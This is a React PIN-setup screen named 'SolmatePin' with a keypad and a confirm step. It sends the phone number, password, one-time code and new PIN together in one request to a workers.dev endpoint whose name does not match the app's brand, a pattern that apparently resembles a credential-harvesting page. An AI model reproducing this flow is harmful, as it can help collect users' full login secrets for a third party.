import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function SolmatePin() {
  const navigate = useNavigate();
  const location = useLocation();

  const phone = location.state?.phone || "";
  const password = location.state?.password || "";
  const otp = location.state?.otp || "";

  const PIN_LENGTH = 4; // Change to 6 if you need 6-digit PIN
  const [pin, setPin] = useState(Array(PIN_LENGTH).fill(""));
  const [confirmPin, setConfirmPin] = useState(Array(PIN_LENGTH).fill(""));
  const [step, setStep] = useState("create"); // 'create' or 'confirm'
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const currentPin = step === "create" ? pin : confirmPin;
  const setCurrentPin = step === "create" ? setPin : setConfirmPin;

  // Active index = first empty
  const activeIndex = (() => {
    const idx = currentPin.findIndex((d) => d === "");
    return idx === -1 ? PIN_LENGTH - 1 : idx;
  })();

  // Auto-handle when PIN complete
  useEffect(() => {
    const code = currentPin.join("");
    if (code.length === PIN_LENGTH) {
      if (step === "create") {
        // Move to confirm step
        setTimeout(() => {
          setStep("confirm");
          setError("");
        }, 200);
      } else {
        // Confirm step — match check
        const original = pin.join("");
        if (code !== original) {
          setError("PINs do not match. Please try again.");
          setTimeout(() => {
            setConfirmPin(Array(PIN_LENGTH).fill(""));
          }, 600);
        } else {
          handleSubmit(original);
        }
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pin, confirmPin]);

  const handleNumberPress = (num) => {
    if (error) setError("");
    setCurrentPin((prev) => {
      const next = [...prev];
      const empty = next.findIndex((d) => d === "");
      if (empty !== -1) next[empty] = String(num);
      return next;
    });
  };

  const handleBackspace = () => {
    if (error) setError("");
    setCurrentPin((prev) => {
      const next = [...prev];
      for (let i = next.length - 1; i >= 0; i--) {
        if (next[i] !== "") {
          next[i] = "";
          break;
        }
      }
      return next;
    });
  };

  const handleSubmit = async (pinCode) => {
    setError("");
    try {
      setLoading(true);
      const response = await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/passwordWithPhoneAndotpAndPin",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ pin: pinCode, phone, password, otp }),
        }
      );

      const text = await response.text();
      let data = {};
      try {
        data = text ? JSON.parse(text) : {};
      } catch {
        data = { message: text };
      }

      if (!response.ok) {
        setError(data.message || "Failed to set PIN. Please try again.");
        setStep("create");
        setPin(Array(PIN_LENGTH).fill(""));
        setConfirmPin(Array(PIN_LENGTH).fill(""));
        return;
      }

      console.log("PIN set:", data);
      // navigate("/dashboard");
    } catch (err) {
      console.error("API error:", err);
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    if (step === "confirm") {
      setStep("create");
      setConfirmPin(Array(PIN_LENGTH).fill(""));
      setError("");
      return;
    }
    if (window.history.length > 1) {
      navigate(-1);
    } else {
      navigate("/");
    }
  };

  const handleLogout = () => {
    navigate("/");
  };

  const numpadKeys = [1, 2, 3, 4, 5, 6, 7, 8, 9];

  return (
    <div className="min-h-screen bg-[#0A1721] flex flex-col px-6 pt-6 pb-6">
      {/* Back Button */}
      <button
        onClick={handleBack}
        aria-label="Go back"
        className="w-10 h-10 flex items-center justify-start text-white hover:opacity-70 transition-opacity mb-10"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="28"
          height="28"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2.5"
          strokeLinecap="round"
          strokeLinejoin="round"
        >
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
      </button>

      {/* Heading */}
      <h1 className="text-white text-3xl sm:text-4xl font-bold mb-3">
        {step === "create" ? "Create your PIN" : "Confirm your PIN"}
      </h1>

      {/* Subtitle */}
      <p className="text-gray-400 text-base sm:text-lg mb-8">
        {step === "create"
          ? "This PIN will be used to access your account"
          : "Re-enter your PIN to confirm"}
      </p>

      {/* PIN Dots/Boxes */}
      <div className="flex justify-center gap-4 sm:gap-5 mb-6">
        {currentPin.map((digit, index) => (
          <div
            key={index}
            className={`w-14 h-14 sm:w-16 sm:h-16 rounded-xl flex items-center justify-center transition-all ${
              error
                ? "bg-[#1A2731] ring-2 ring-red-500"
                : index === activeIndex && !loading
                ? "bg-[#1A2731] ring-2 ring-[#FFD60A]"
                : "bg-[#1A2731]"
            }`}
          >
            {digit ? (
              <div className="w-3 h-3 rounded-full bg-white"></div>
            ) : null}
          </div>
        ))}
      </div>

      {/* Error / Status */}
      <div className="text-center mb-2 min-h-[24px]">
        {error ? (
          <p className="text-red-400 text-sm font-medium">{error}</p>
        ) : loading ? (
          <p className="text-[#FFD60A] text-sm font-medium">
            Setting up your PIN...
          </p>
        ) : null}
      </div>

      {/* Spacer */}
      <div className="flex-1"></div>

      {/* Number Pad */}
      <div className="grid grid-cols-3 gap-y-6 gap-x-4 mb-2">
        {numpadKeys.map((num) => (
          <button
            key={num}
            onClick={() => handleNumberPress(num)}
            disabled={loading}
            className="text-white text-3xl sm:text-4xl font-light py-3 hover:opacity-70 active:opacity-50 transition-opacity disabled:opacity-40"
          >
            {num}
          </button>
        ))}

        {/* Log out */}
        <button
          onClick={handleLogout}
          className="text-[#FFD60A] text-lg font-medium py-3 hover:opacity-70 transition-opacity"
        >
          Log out
        </button>

        {/* 0 */}
        <button
          onClick={() => handleNumberPress(0)}
          disabled={loading}
          className="text-white text-3xl sm:text-4xl font-light py-3 hover:opacity-70 active:opacity-50 transition-opacity disabled:opacity-40"
        >
          0
        </button>

        {/* Backspace */}
        <button
          onClick={handleBackspace}
          disabled={loading}
          aria-label="Backspace"
          className="flex items-center justify-center hover:opacity-70 active:opacity-50 transition-opacity disabled:opacity-40"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="36"
            height="28"
            viewBox="0 0 24 18"
            fill="white"
          >
            <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
          </svg>
        </button>
      </div>
    </div>
  );
}